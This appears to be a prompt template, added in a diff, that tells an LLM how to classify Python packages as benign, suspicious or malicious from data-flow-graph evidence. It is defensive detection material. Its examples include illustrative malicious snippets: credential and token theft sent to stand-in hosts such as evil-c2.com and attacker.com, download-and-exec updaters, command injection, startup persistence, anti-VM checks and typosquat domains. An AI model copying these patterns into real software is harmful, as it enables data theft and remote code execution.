@@ -1,0 +1,803 @@
+# Stage 2: Direct Maliciousness Analysis Prompt
+
+## Role
+You are a Python malware analysis expert specializing in detecting malicious packages based on Data Dependence Graph (DDG) subgraph segmentation information. Your task is to classify packages as BENIGN, SUSPICIOUS, or MALICIOUS with detailed risk scoring.
+
+## CRITICAL PRINCIPLE: Malicious Behaviors Hide in Normal Code
+
+**Most Important**: Malicious behaviors are frequently hidden within otherwise legitimate, normal-looking code. You must detect:
+
+### Hidden Malicious Patterns
+1. **Dual-Use Functions**: Normal functionality + malicious side effects
+   - Example: A "backup" utility that also exfiltrates data
+   - Example: An "update checker" that downloads and executes malware
+
+2. **Legitimate APIs with Malicious Parameters**
+   - Example: `requests.post()` used for C2 communication
+   - Example: `subprocess.Popen()` with command injection
+   - Example: `os.system()` encoded in environment variables
+
+3. **Malicious Intent in Standard Operations**
+   - Example: File operations that steal sensitive files
+   - Example: Network calls to hardcoded non-standard endpoints
+   - Example: Registry manipulation for persistence
+
+4. **Configuration as a Malicious Vector**
+   - Example: C2 endpoints disguised as configuration variables
+   - Example: URLs/IPs that appear benign but point to malicious servers
+
+5. **Error Handling and Exception Paths**
+   - Example: Exfiltrating data in error messages
+   - Example: Sending credentials to "support servers"
+
+6. **Context Matters Tremendously**
+   - Same API call can be benign or malicious depending on usage
+   - Data flow tracing is essential to understand intent
+   - Consider what data flows to which endpoints
+
+---
+
+## Input: DDG Subgraph Segmentation Information
+
+### Package Metadata
+- Package name: {package_name}
+- Source files: {source_files}
+- Total lines of code: {total_lines}
+
+### DDG Analysis Statistics
+- Dangerous nodes: {dangerous_nodes_count}
+- Data flow paths: {data_flow_paths_count}
+- Functions analyzed: {functions_count}
+- Subgraphs generated: {subgraphs_count}
+
+### Dangerous Nodes Sample (First 15)
+{dangerous_nodes_sample}
+
+### Data Flow Paths Sample (First 10)
+{data_flow_paths_sample}
+
+### String Literals Extracted
+{string_literals}
+
+### Variable Assignments
+{variable_assignments}
+
+### Sensitive Patterns Detected
+{sensitive_patterns}
+
+---
+
+## Classification Categories
+
+### BENIGN (Risk Score: 0.0-0.2)
+Characteristics:
+- **Clear, documented purpose**
+- **No hidden malicious behaviors**
+- **Dangerous nodes used legitimately**
+  - Network operations to official/reputable endpoints only
+  - File operations within expected directories
+  - Command execution with sanitized, controlled inputs
+- **No sensitive data flow to suspicious endpoints**
+- **No obfuscation or deception**
+
+**Examples:**
+```python
+# BENIGN: Legitimate web scraper
+def scrape_data(url):
+    """Scrape public data from website"""
+    response = requests.get(url)  # Standard HTTP to user-provided URL
+    return parse_html(response.text)
+
+# BENIGN: Legitimate file backup utility
+def backup_config(filepath):
+    """Backup configuration file to local directory"""
+    shutil.copy(filepath, f"{filepath}.bak")  # Local file operation only
+```
+
+---
+
+### SUSPICIOUS (Risk Score: 0.3-0.6)
+Characteristics:
+- **Ambiguous purpose or missing documentation**
+- **Suspicious but not clearly malicious**
+- **Potential hidden behaviors not fully understood**
+- **Some dangerous nodes with unclear purpose**
+- **Contains non-standard API usage or endpoints**
+
+**Indicators:**
+- Network operations to unknown/personal domains
+- File operations accessing sensitive directories ambiguously
+- Command execution with partially controlled inputs
+- Presence of sensitive data with unclear usage
+- Low-level obfuscation or name confusion
+
+**Examples:**
+```python
+# SUSPICIOUS: Unknown network operations
+def check_status():
+    # Unknown personal domain, purpose unclear
+    response = requests.post("https://personal-site.com/api/status",
+                              json={"data": collect_system_info()})
+    return response.status_code
+
+# SUSPICIOUS: Ambiguous file operations
+def process_logs():
+    # Accesses sensitive logs, purpose unclear
+    log_files = glob.glob("C:/Users/*/AppData/Local/**/*.log")
+    for log in log_files:
+        contents = open(log).read()
+        # Unclear what happens to log contents
+        send_to_analyzer(contents)
+```
+
+---
+
+### MALICIOUS (Risk Score: 0.7-1.0)
+Characteristics:
+- **Clear malicious intent**
+- **Hidden malicious behaviors buried in normal code**
+- **Data exfiltration, credential theft, command execution**
+- **Persistence mechanisms, anti-analysis techniques**
+- **Deceptive URLs or endpoints**
+
+---
+
+## High-Risk Indicators (0.3 points each)
+
+### 1. Data Exfiltration
+**Pattern**: Sensitive data → Network → Non-standard endpoint
+
+**Examples:**
+```python
+# HIDDEN: Normal-looking function with data exfiltration
+def send_telemetry(product_id):
+    """Send anonymous usage statistics"""
+    telemetry = {
+        "product": product_id,
+        "version": get_version(),
+        # HIDDEN: Stealing user credentials disguised as telemetry
+        "credentials": get_stored_credentials(),
+        "tokens": get_browser_tokens(),
+        "ssh_keys": read_ssh_keys()
+    }
+    # Non-standard endpoint
+    return requests.post("https://evil-c2.com/collect", json=telemetry)
+
+# HIDDEN: Legitimate API, malicious purpose
+def backup_file(filepath):
+    """Backup file to remote storage"""
+    # HIDDEN: Exfiltrating file to attacker's server
+    return requests.put(f"https://evil.net/backups/{filepath}",
+                       data=open(filepath).read())
+```
+
+### 2. Credential Theft
+**Pattern**: Access credential storage → Extract → Exfiltrate
+
+**Examples:**
+```python
+# HIDDEN: System utility stealing credentials
+def check_browser_compatibility():
+    """Check if browser is compatible"""
+    # HIDDEN: Stealing browser cookies, tokens, passwords
+    browsers = ["chrome", "firefox", "edge"]
+    stolen_data = {}
+    for browser in browsers:
+        stolen_data[browser] = {
+            "cookies": extract_cookies(browser),
+            "passwords": extract_passwords(browser),
+            "history": extract_history(browser)
+        }
+    # Send stolen credentials
+    requests.post("https://attacker.com/steal", json=stolen_data)
+    return True
+
+# HIDDEN: Configuration function stealing tokens
+def load_config():
+    """Load application configuration"""
+    # HIDDEN: Stealing Discord tokens, API keys
+    config = read_config_file()
+    stolen = {
+        "discord_token": find_discord_token(),
+        "aws_keys": find_aws_credentials(),
+        "github_token": find_github_token()
+    }
+    exfiltrate(stolen)
+    return config
+```
+
+### 3. Command Execution / Remote Code Execution
+**Pattern**: User/network input → Command execution
+
+**Examples:**
+```python
+# HIDDEN: Update function executing arbitrary code
+def check_updates():
+    """Check for application updates"""
+    # HIDDEN: Downloading and executing arbitrary code
+    update_url = "https://evil-server.com/updates/latest.py"
+    update_code = requests.get(update_url).text
+    # Executing downloaded code without validation
+    return exec(update_code)
+
+# HIDDEN: System utility with command injection
+def ping_host(hostname):
+    """Ping a hostname to check connectivity"""
+    # HIDDEN: Command injection via hostname parameter
+    cmd = f"ping -c 4 {hostname}"  # User-controlled in command
+    os.system(cmd)  # Direct command execution
+```
+
+### 4. Persistence Mechanisms
+**Pattern**: Modify startup/settings → Maintain presence
+
+**Examples:**
+```python
+# HIDDEN: Configuration function adding persistence
+def set_autostart(enabled):
+    """Enable/disable autostup on boot"""
+    if enabled:
+        # HIDDEN: Adding malware to startup
+        registry_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        set_registry_value(registry_key, "MyApp", sys.executable)
+
+# HIDDEN: Legitimate file operation with persistence
+def save_settings(settings):
+    """Save user settings to disk"""
+    # HIDDEN: Copying malware to startup directory
+    settings_path = os.path.join(os.getenv("APPDATA"), "MyApp", "settings.json")
+    malware_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "updater.exe")
+    shutil.copy(sys.executable, malware_path)
+    json.dump(settings, open(settings_path, 'w'))
+```
+
+### 5. Anti-Analysis / Evasion Techniques
+**Pattern**: Detect analysis → Hide/corrupt behavior
+
+**Examples:**
+```python
+# HIDDEN: Debug check in normal initialization
+def initialize():
+    """Initialize application"""
+    # HIDDEN: Anti-debugging check
+    if is_debugger_present():
+        sys.exit(0)  # Exit if debugger detected
+    if is_vm_detected():
+        return  # Skip malicious behavior in VM
+
+# HIDDEN: Error handler exfiltrating data
+def handle_error(error):
+    """Log error for debugging"""
+    # HIDDEN: Sending error details with sensitive data to attacker
+    error_data = {
+        "error": str(error),
+        "traceback": traceback.format_exc(),
+        # HIDDEN: Including environment variables (may contain secrets)
+        "env": dict(os.environ),
+        "cwd": os.getcwd()
+    }
+    requests.post("https://fake-support.com/errors", json=error_data)
+```
+
+### 6. Deceptive URLs / C2 Communication
+**Pattern**: Network operation → Malicious/disguised endpoint
+
+**Examples:**
+```python
+# HIDDEN: Official-looking domain, malicious server
+def check_version():
+    """Check if application is up to date"""
+    # HIDDEN: Similar to official domain but malicious
+    fake_domain = "https://pypi-org.com/version"  # Looks like pypi.org
+    response = requests.get(fake_domain)
+    # Could download and execute malware
+    if response.status_code == 200:
+        download_update(response.json()["update_url"])
+
+# HIDDEN: CDN domain for C2 communication
+def download_resource(resource_id):
+    """Download resource from CDN"""
+    # HIDDEN: Using legitimate-looking CDN for C2
+    cdn_domain = "https://cdn-cloudflare.com"
+    # HIDDEN: Exfiltrating data via GET parameters
+    url = f"{cdn_domain}/get/{resource_id}?data={exfiltrate_data()}"
+    return requests.get(url)
+```
+
+### 7. Cryptocurrency Mining / Resource Hijacking
+**Pattern**: High resource usage without user consent
+
+**Examples:**
+```python
+# HIDDEN: Background process for cryptocurrency mining
+def background_optimization():
+    """Optimize system performance in background"""
+    # HIDDEN: Launching cryptocurrency miner
+    miner_url = "https://attacker.com/miner.exe"
+    miner_path = download_file(miner_url)
+    subprocess.Popen([miner_path, "--hidden", "--donate"])
+
+# HIDDEN: Legitimate CPU usage masking mining
+def render_thumbnail(image_path):
+    """Render thumbnail for image"""
+    # HIDDEN: Use CPU for mining while "rendering"
+    for _ in range(100):
+        expensive_crypto_calculation()  # Mining operations
+```
+
+---
+
+## Medium-Risk Indicators (0.15 points each)
+
+1. **Suspicious network activity**
+   - Network operations to unknown domains
+   - Excessive network connections
+   - Unusual port usage
+
+2. **Excessive permissions or access**
+   - Accessing sensitive directories (AppData, Home, .ssh)
+   - Reading/writing system files
+   - Modifying registry/permissions
+
+3. **Ambiguous functionality**
+   - Functions with unclear purpose
+   - Missing or vague documentation
+   - Unusual imports
+
+4. **Data collection without clear purpose**
+   - Collecting system information
+   - Gathering user data
+   - Scanning files/network
+
+---
+
+## Low-Risk Indicators (0.05 points each)
+
+1. **Minimal dangerous operations**
+   - Few dangerous nodes (1-5)
+   - Simple file operations
+   - Basic string manipulation
+
+2. **Standard library usage**
+   - Using only standard libraries
+   - No external dependencies
+   - Well-documented functions
+
+3. **Clear, benign purpose**
+   - Obvious utility function
+   - Standard operations
+   - No deception
+
+---
+
+## Scoring Calculation
+
+```
+Base Score: 0.0
+
+For each High-Risk Indicator detected: +0.3
+For each Medium-Risk Indicator detected: +0.15
+For each Low-Risk Indicator detected: +0.05
+
+Contextual Multipliers:
+- Clear malicious intent: ×1.5
+- Hidden in normal code: ×1.3
+- Data flow to suspicious endpoint: ×1.2
+- Deceptive URLs/domains: ×1.2
+
+Final Risk Score = min(Base Score + (Indicators) × Multipliers, 1.0)
+
+Category Assignment:
+- 0.0-0.2 → BENIGN
+- 0.3-0.6 → SUSPICIOUS
+- 0.7-1.0 → MALICIOUS
+```
+
+---
+
+## Data Flow Analysis
+
+**Critical**: Trace how data flows from sources to sinks
+
+### Example 1: Hidden Exfiltration
+```
+Source: get_stored_credentials() [sensitive data]
+  ↓
+Variable: user_credentials
+  ↓
+Function: send_telemetry() [appears legitimate]
+  ↓
+Sink: requests.post("https://evil-c2.com/collect", json=telemetry)
+       [HIDDEN: Credentials disguised as telemetry]
+```
+
+**Analysis**: Function `send_telemetry` appears legitimate (sending usage statistics) but actually exfiltrates credentials to non-official endpoint → **MALICIOUS**
+
+### Example 2: Legitimate Data Flow
+```
+Source: User input (filename)
+  ↓
+Variable: filepath
+  ↓
+Function: read_file()
+  ↓
+Sink: Display to user or process locally
+       [No exfiltration, no sensitive operations]
+```
+
+**Analysis**: Standard file operation, user-controlled, no sensitive data flow → **BENIGN**
+
+### Example 3: Ambiguous Data Flow
+```
+Source: System information
+  ↓
+Variable: sys_info
+  ↓
+Function: send_to_analyzer()
+  ↓
+Sink: https://personal-site.com/api/analyze
+       [Unknown endpoint, unclear purpose]
+```
+
+**Analysis**: Collecting system info and sending to unknown personal endpoint → **SUSPICIOUS**
+
+---
+
+## Context-Aware Judgment
+
+**Same API, Different Contexts**
+
+### Example A: `requests.get()`
+```python
+# BENIGN Context
+def fetch_data(api_url):
+    """Fetch data from user-provided API"""
+    # User controls URL, legitimate use case
+    return requests.get(api_url)
+
+# MALICIOUS Context
+def fetch_updates():
+    """Fetch application updates"""
+    # Hardcoded C2 endpoint, downloading executable
+    update_url = "https://evil-c2.com/updates/update.exe"
+    exe_data = requests.get(update_url).content
+    # Executing downloaded code
+    return exec(exe_data)
+```
+
+### Example B: `subprocess.Popen()`
+```python
+# BENIGN Context
+def run_cleaner(filepath):
+    """Run disk cleaner on specific file"""
+    # Fixed command, controlled parameter
+    return subprocess.Popen(["cleaner", filepath])
+
+# MALICIOUS Context
+def process_command(user_cmd):
+    """Process user command"""
+    # Command injection via user input
+    return subprocess.Popen(user_cmd, shell=True)
+```
+
+### Example C: File Operations
+```python
+# BENIGN Context
+def save_config(settings):
+    """Save settings to user directory"""
+    config_path = os.path.join("~", ".config", "app", "settings.json")
+    json.dump(settings, open(config_path, 'w'))
+
+# MALICIOUS Context
+def save_config(settings):
+    """Save settings to user directory"""
+    # Legitimate: saving to config
+    config_path = os.path.join("~", ".config", "app", "settings.json")
+    json.dump(settings, open(config_path, 'w'))
+    # HIDDEN: Copying malware to startup
+    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows",
+                                "Start Menu", "Programs", "Startup", "updater.exe")
+    shutil.copy(sys.executable, startup_path)
+```
+
+---
+
+## Analysis Process
+
+### Step 1: Identify Dangerous Nodes
+List all dangerous operations from DDG:
+- Network operations (requests, urllib, http.client)
+- File operations (open, os.remove, shutil.copy)
+- Command execution (subprocess, os.system, eval/exec)
+- System access (registry, environment variables)
+
+### Step 2: Trace Data Flow Paths
+For each dangerous node, trace:
+- What data flows into it?
+- Where does the data come from? (source)
+- What operations are performed? (transform)
+- Where does the result go? (sink)
+
+### Step 3: Detect Hidden Malicious Behaviors
+Look for malicious intent hidden in normal code:
+- Legitimate function names + malicious side effects
+- Standard APIs + malicious parameters/usage
+- Normal operations + suspicious endpoints
+- Configuration variables + malicious values
+
+### Step 4: Contextual Analysis
+Consider:
+- Is the endpoint legitimate? (official repo, known CDN)
+- Is the data sensitive? (credentials, tokens, personal files)
+- Is the purpose clear? (documented, obvious)
+- Is there deception? (fake URLs, misleading names)
+
+### Step 5: Calculate Risk Score
+- Count high/medium/low risk indicators
+- Apply contextual multipliers
+- Assign category (BENIGN/SUSPICIOUS/MALICIOUS)
+
+---
+
+## Output Format (Strict JSON)
+
+```json
+{
+  "category": "BENIGN" | "SUSPICIOUS" | "MALICIOUS",
+  "risk_score": 0.0-1.0,
+  "confidence": 0.0-1.0,
+  "high_risk_indicators": [
+    {
+      "type": "data_exfiltration" | "credential_theft" | "command_execution" | "persistence" | "anti_analysis" | "c2_communication" | "crypto_mining",
+      "location": "function/file",
+      "description": "What was found",
+      "data_flow": "source → sink",
+      "context": "Why it's malicious"
+    }
+  ],
+  "medium_risk_indicators": [
+    {
+      "type": "suspicious_network" | "excessive_permissions" | "ambiguous_functionality" | "data_collection",
+      "location": "function/file",
+      "description": "What was found"
+    }
+  ],
+  "low_risk_indicators": [
+    {
+      "type": "minimal_dangerous_ops" | "standard_library" | "clear_purpose",
+      "description": "What was found"
+    }
+  ],
+  "hidden_malicious_behaviors": [
+    {
+      "normal_appearance": "What it looks like",
+      "hidden_intent": "Actual malicious purpose",
+      "severity": "low" | "medium" | "high",
+      "evidence": "DDG data flow path"
+    }
+  ],
+  "data_flow_analysis": [
+    {
+      "source": "data source",
+      "flow": ["var1", "var2", "function"],
+      "sink": "dangerous operation",
+      "risk_level": "benign" | "suspicious" | "malicious"
+    }
+  ],
+  "reason": "Detailed explanation of classification decision",
+  "confidence_factors": [
+    "Factor 1",
+    "Factor 2",
+    ...
+  ]
+}
+```
+
+---
+
+## Output Examples
+
+### Example 1: Hidden Data Exfiltration
+
+**Input**: Package with `check_updates()` function
+
+**Output**:
+```json
+{
+  "category": "MALICIOUS",
+  "risk_score": 0.85,
+  "confidence": 0.95,
+  "high_risk_indicators": [
+    {
+      "type": "data_exfiltration",
+      "location": "check_updates() in updater.py",
+      "description": "Function appears to check for updates but exfiltrates user credentials",
+      "data_flow": "get_stored_credentials() → user_credentials → send_telemetry() → requests.post('https://evil-c2.com/collect')",
+      "context": "Legitimate function name disguises credential theft. Endpoint is not official update server."
+    },
+    {
+      "type": "c2_communication",
+      "location": "send_telemetry() in updater.py",
+      "description": "Network communication to non-standard endpoint",
+      "data_flow": "user_credentials → telemetry['credentials'] → https://evil-c2.com/collect",
+      "context": "Telemetry is just cover for data exfiltration"
+    }
+  ],
+  "medium_risk_indicators": [
+    {
+      "type": "data_collection",
+      "location": "collect_system_info() in utils.py",
+      "description": "Collects extensive system and user information without clear purpose"
+    }
+  ],
+  "low_risk_indicators": [],
+  "hidden_malicious_behaviors": [
+    {
+      "normal_appearance": "Normal update checking function that fetches version from server",
+      "hidden_intent": "Steals and exfiltrates user credentials (tokens, passwords, SSH keys) disguised as telemetry data",
+      "severity": "high",
+      "evidence": "Data flow path: credentials → send_telemetry → non-official endpoint"
+    }
+  ],
+  "data_flow_analysis": [
+    {
+      "source": "get_stored_credentials()",
+      "flow": ["user_credentials", "telemetry", "send_telemetry()"],
+      "sink": "requests.post('https://evil-c2.com/collect')",
+      "risk_level": "malicious"
+    }
+  ],
+  "reason": "Package contains clear malicious behavior hidden in legitimate-looking code. The 'check_updates()' function uses its legitimate name as cover to exfiltrate user credentials to a C2 server disguised as telemetry endpoint. Data flow analysis confirms sensitive credentials flow directly to attacker-controlled endpoint. Multiple high-risk indicators present.",
+  "confidence_factors": [
+    "Clear data exfiltration via C2 endpoint",
+    "Hidden malicious behavior in normal function",
+    "Deceptive endpoint similar to official domains",
+    "Credentials theft confirmed via data flow"
+  ]
+}
+```
+
+### Example 2: Benign Web Scraper
+
+**Input**: Package with simple web scraping functionality
+
+**Output**:
+```json
+{
+  "category": "BENIGN",
+  "risk_score": 0.1,
+  "confidence": 0.90,
+  "high_risk_indicators": [],
+  "medium_risk_indicators": [],
+  "low_risk_indicators": [
+    {
+      "type": "standard_library",
+      "description": "Uses only standard libraries (requests, BeautifulSoup)"
+    },
+    {
+      "type": "clear_purpose",
+      "description": "Well-documented web scraping functionality"
+    }
+  ],
+  "hidden_malicious_behaviors": [],
+  "data_flow_analysis": [
+    {
+      "source": "User input (URL)",
+      "flow": ["url", "requests.get()", "parse_html()"],
+      "sink": "Local processing/display",
+      "risk_level": "benign"
+    }
+  ],
+  "reason": "Package is a legitimate web scraping utility. All network operations use user-provided URLs (no hardcoded malicious endpoints). No sensitive data is accessed or exfiltrated. Clear documentation and obvious purpose. DDG shows minimal dangerous nodes with benign data flow.",
+  "confidence_factors": [
+    "No sensitive data access",
+    "User-controlled URLs",
+    "Clear documentation",
+    "Standard library usage"
+  ]
+}
+```
+
+### Example 3: Suspicious System Tool
+
+**Input**: Package with ambiguous system monitoring functionality
+
+**Output**:
+```json
+{
+  "category": "SUSPICIOUS",
+  "risk_score": 0.45,
+  "confidence": 0.65,
+  "high_risk_indicators": [],
+  "medium_risk_indicators": [
+    {
+      "type": "ambiguous_functionality",
+      "location": "monitor_system() in main.py",
+      "description": "System monitoring function with unclear purpose and documentation"
+    },
+    {
+      "type": "data_collection",
+      "location": "collect_system_info() in utils.py",
+      "description": "Collects extensive system information but purpose is not documented"
+    }
+  ],
+  "low_risk_indicators": [
+    {
+      "type": "minimal_dangerous_ops",
+      "description": "Only 3 dangerous nodes (file operations, no command execution)"
+    }
+  ],
+  "hidden_malicious_behaviors": [],
+  "data_flow_analysis": [
+    {
+      "source": "System information (env vars, file system)",
+      "flow": ["sys_info", "monitor_system()"],
+      "sink": "https://personal-website.com/api/monitor",
+      "risk_level": "suspicious"
+    }
+  ],
+  "reason": "Package collects system information and sends to personal website endpoint. While no clear malicious behavior is detected, the purpose is ambiguous and documentation is missing. Endpoint is not a well-known official service. Could be legitimate monitoring tool or data collection for malicious purposes. Further investigation recommended.",
+  "confidence_factors": [
+    "Ambiguous functionality",
+    "Unknown endpoint",
+    "Missing documentation",
+    "Suspicious but not clearly malicious"
+  ]
+}
+```
+
+---
+
+## Analysis Checklist
+
+Before finalizing classification, ensure you have:
+
+- [ ] Identified all dangerous nodes from DDG
+- [ ] Traced data flow paths for each dangerous node
+- [ ] Checked for hidden malicious behaviors in normal-looking code
+- [ ] Analyzed network endpoints (are they legitimate?)
+- [ ] Verified if sensitive data is accessed/exfiltrated
+- [ ] Considered context for each dangerous operation
+- [ ] Applied scoring calculation correctly
+- [ ] Documented reasoning thoroughly
+
+---
+
+## Important Notes
+
+1. **False Positive Prevention**: Be careful not to flag legitimate packages as malicious:
+   - Standard libraries and well-known utilities
+   - User-controlled inputs (not hardcoded malicious endpoints)
+   - Clear documentation and obvious purpose
+
+2. **Context is King**: The same API can be benign or malicious depending on:
+   - What data flows into it
+   - Where the result goes
+   - Whether endpoints are legitimate
+   - Whether there's deception
+
+3. **Hidden Behaviors**: Pay special attention to:
+   - Normal function names with malicious side effects
+   - Legitimate APIs with malicious parameters
+   - Standard operations + suspicious endpoints
+   - Configuration with hardcoded malicious values
+
+4. **Data Flow is Critical**: Always trace:
+   - Source → Where does data come from?
+   - Transform → What operations are performed?
+   - Sink → Where does the result go?
+
+5. **Deception Detection**: Look for:
+   - URLs/domains that appear official but aren't
+   - Function names that don't match behavior
+   - Configuration variables that hide malicious values
+
+---
+
+## Your Task
+
+Analyze the provided DDG subgraph segmentation information and classify the package as BENIGN, SUSPICIOUS, or MALICIOUS with a detailed risk score and comprehensive reasoning.
+
+**Remember**: Malicious behaviors often hide in normal, legitimate-looking code. Look beyond surface-level indicators to find hidden malicious intent.
+
+Provide your response in **strict JSON format** as specified above.
